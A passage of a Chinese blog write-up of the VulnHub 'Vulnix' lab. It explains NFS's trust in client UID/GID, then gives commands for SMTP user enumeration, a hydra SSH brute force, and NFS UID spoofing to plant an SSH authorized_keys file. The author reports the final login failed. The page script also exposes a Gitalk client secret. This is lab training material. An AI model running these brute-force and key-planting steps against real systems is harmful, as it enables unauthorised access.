class="line">NFS客户端向服务器发送一次请求的完整流程如下：</span><br><span class="line">本地用户查看网络目录文件，发送list指令到客户机内核。</span><br><span class="line">客户机内核识别出该目录为NFS网络共享目录，随即发送RPC数据包，向服务器的<span class="number">111</span>号端口查询服务器NFS mountd服务注册的端口号。</span><br><span class="line">服务器接收了客户机的查询指令，返回了mountd服务的端口号。</span><br><span class="line">客户机向服务器的mountd服务端口发送访问请求。</span><br><span class="line">服务器的mountd服务接收到客户机的访问请求后，首先查询访问控制列表，若客户机允许访问，则创建访问令牌并将其返回给客户机。</span><br><span class="line">客户机带访问令牌访问nfsd主服务。nfsd主服务校验令牌后发送list指令到服务器内核并向客户机返回执行结果。若客户机用户<span class="built_in">UID</span>和GID经集中映射后，和要访问的文件所有者<span class="built_in">UID</span>与GID信息不一致，则返回拒绝访问。</span><br><span class="line">客户机内核接收到执行结果后，将其返回至用户Shell。流程结束。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NFS安全问题</span><br><span class="line">我们都知道，NFS服务只是根据客户机发送的<span class="built_in">UID</span>和GID信息进行文件权限识别。但是如果有一台恶意机器通过已经泄露的<span class="built_in">UID</span>和GID信息访问甚至向服务器上传或覆盖文件呢？</span><br><span class="line">一般情况下，只要在恶意机器中创建一个和服务器文件所有者相同<span class="built_in">UID</span>、GID的账户，就可以对服务器文件进行读写，如果允许的话。这样攻击者就可以对机器进行渗透甚至提权。</span><br><span class="line"></span><br><span class="line">通过showmount -e <span class="number">192.168</span><span class="number">.240</span><span class="number">.131</span>，我们发现vulnix账号以及它的home的目录</span><br><span class="line">使用SMTP邮件服务的VRFY命令验证用户 存在</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241125170418503.png" alt="image-20241125170418503"></p>
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241125170718267.png" alt="image-20241125170718267"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">22</span>端口 版本号是OpenSSH <span class="number">5</span>.<span class="number">9</span>p1 有用户名枚举  https://www.cnblogs.com/su-sds/p/<span class="number">17414659</span>.html，同样可以探测出用户名</span><br><span class="line"></span><br><span class="line"><span class="attribute">hydra</span> -L ./user -P /usr/share/wordlists/metasploit/unix_passwords.txt -t <span class="number">10</span> ssh://<span class="number">192.168.240.131</span> </span><br><span class="line"><span class="attribute">login</span>: user   password: letmein</span><br><span class="line"><span class="attribute">ssh</span> user@<span class="number">192.168.240.131</span>  通过ssh直接登录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241125204400626.png" alt="image-20241125204400626">	</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinEnum.<span class="keyword">sh </span> linpeas.ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241126225141467.png" alt="image-20241126225141467"></p>
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241126231357968.png" alt="image-20241126231357968"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -pthread dirty.c -o dirty -lcrypt  用脏牛试一下不行</span><br><span class="line">这里提权需要用NFS文件系统服务</span><br><span class="line">查看用户vulnix的UID和其所属组的GID，发现为<span class="number">2008</span>:<span class="number">2008</span>。既然如此，我们直接在本地（攻击机）创建一个UID和GID均为<span class="number">2008</span>的用户对NFS进行挂载即可。执行一下命令</span><br><span class="line">groupadd -g <span class="number">2008</span> vulnix</span><br><span class="line">adduser --uid <span class="number">2008</span> --gid <span class="number">2008</span> vulnix</span><br><span class="line">su vulnix</span><br><span class="line">mkdir <span class="regexp">/mnt/</span>vulnix_nfs</span><br><span class="line">chown -hR nfsattack:nfsattack <span class="regexp">/mnt/</span>vulnix_nfs</span><br><span class="line">mount -t nfs <span class="number">192.168</span>.<span class="number">240.131</span>:<span class="regexp">/home/</span>vulnix <span class="regexp">/mnt/</span>vulnix_nfs</span><br><span class="line"></span><br><span class="line">直接创建SSH配置文件夹并上传公钥文件。</span><br><span class="line">首先切换至原用户(我原来在本地用root)，使用ssh-keygen命令生成公私钥，并将公钥文件改名为authorized_keys上传，权限为<span class="number">600</span>：</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">ssh-keygen</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub &gt; <span class="regexp">/home/</span>nfsattack/authorized_keys</span><br><span class="line">su nfsattack</span><br><span class="line">cd <span class="regexp">/mnt/</span>vulnix_nfs</span><br><span class="line">mkdir .ssh</span><br><span class="line">cat ~<span class="regexp">/authorized_keys &gt; ./</span>.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> .<span class="regexp">/.ssh/</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh -o <span class="string">&#x27;PubkeyAcceptedKeyTypes +ssh-rsa&#x27;</span> -i id_rsa vulnix@<span class="number">192.168</span>.<span class="number">240.131</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就在这里，ssh一直登不上，遂放弃</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../miss-miniconda-%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E5%BD%95/">Miss-miniconda-使用备忘录</a>
+            
+            
+            <a class="next" rel="next" href="../vulnhub-20-neuromancer/">Vulnhub-20.Neuromancer</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
